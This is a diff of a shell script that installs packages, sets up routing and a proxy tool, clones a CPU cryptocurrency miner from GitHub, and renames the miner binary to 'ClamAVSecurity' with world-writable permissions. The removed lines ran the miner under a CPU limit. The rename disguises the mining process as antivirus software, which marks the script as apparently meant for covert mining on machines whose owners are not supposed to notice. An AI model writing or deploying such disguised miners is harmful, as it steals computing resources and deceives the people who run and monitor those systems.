@@ -80,9 +80,9 @@ route add 117.7.81.138 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com/ > ip.txt
 
-sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y
+#!/bin/bash
+sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install tsocks
 git clone https://github.com/quangvu1602/ariocppminer.git
 cd ariocppminer
-mv ariocppminer_avx2 dongqn
-chmod 0777 dongqn
-cpulimit --exe dongqn --limit 1280 -b && ./dongqn
+mv ariocppminer_avx2 ClamAVSecurity
+chmod 0777 ClamAVSecurity
